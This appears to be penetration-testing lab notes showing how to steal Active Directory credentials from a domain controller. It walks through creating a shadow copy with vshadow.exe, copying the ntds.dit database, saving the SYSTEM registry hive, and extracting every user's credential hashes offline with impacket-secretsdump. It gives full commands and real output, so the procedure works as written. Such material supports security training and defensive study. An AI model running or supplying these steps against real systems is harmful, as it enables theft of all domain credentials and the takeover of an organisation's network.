# Shadow Copies

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

To manage shadow copies, the Microsoft signed binary `vshadow.exe` is offered as part of the Windows SDK.

As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of said database, we can extract every user credential offline on our local kali machine.

We can start with an admin shell on DC1 domain controller.

```
vshadow.exe -nw -p C:
```

```
C:\Tools>vshadow.exe -nw -p C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2 <- We are looking here
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
```

- `-nw` Disables writers to speed up backup creation
- `-p` stores the copy on disk

We can now copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and append the full `ntds.dit` path.

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

Next we need to save the SYSTEM hive from the windows registry to correctly extract the contents of `ntds.dit`

```
reg save hklm\system c:\system.bak
```

Once the two `.bak` files are moved to our kali machine, we can extract credentials with `impacket-secretsdump`

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
